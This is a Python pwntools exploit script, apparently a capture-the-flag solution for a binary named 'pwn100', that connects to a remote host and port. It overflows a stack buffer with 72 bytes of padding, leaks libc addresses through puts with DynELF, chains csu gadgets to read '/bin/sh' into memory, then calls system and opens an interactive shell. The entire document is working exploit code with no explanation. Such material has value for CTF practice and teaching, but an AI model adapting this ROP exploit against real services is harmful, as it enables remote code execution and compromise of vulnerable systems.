from pwn import *

context(arch="amd64",os="linux",log_level="debug")
con = remote('111.200.241.244',51585)
# con = process('./pwn100')
elf = ELF('./pwn100')
puts_addr = elf.plt['puts']
read_addr = elf.got['read']
start_addr = 0x400550
pop_rdi = 0x400763
gadget1 = 0x40075A
gadget2 = 0x400740
str_addr = 0x601040

def leak(addr):
    payload = "A"*72 + p64(pop_rdi) + p64(addr) + p64(puts_addr) + p64(start_addr)
    payload = payload.ljust(200,'B')
    con.send(payload)
    con.recvuntil("bye~\n")
    up = ''
    content = ''
    while True: 
        c = con.recv(numb=1, timeout=0.1)
        if up == '\n' and c == "":
            content = content[:-1]+'\x00'
            break
        else:
            content += c
            up = c
    content = content[:4]
    return content

d = DynELF(leak,elf=elf)
system_addr =  d.lookup('system','libc')

# call read 
payload = "A"*72
payload += p64(gadget1)
payload += p64(0)
payload += p64(1)
payload += p64(read_addr)
payload += p64(8)
payload += p64(str_addr)
payload += p64(0)
payload += p64(gadget2)
payload += "\x00"* 56  # add rsp,8
payload += p64(start_addr)
payload = payload.ljust(200,'B')

# input str
con.send(payload)
con.recvuntil("bye~\n")
con.send('/bin/sh\x00')

# call system
payload = "A"*72
payload += p64(pop_rdi) + p64(str_addr) + p64(system_addr)
payload =  payload.ljust(200,"B")
con.send(payload)

con.interactive()
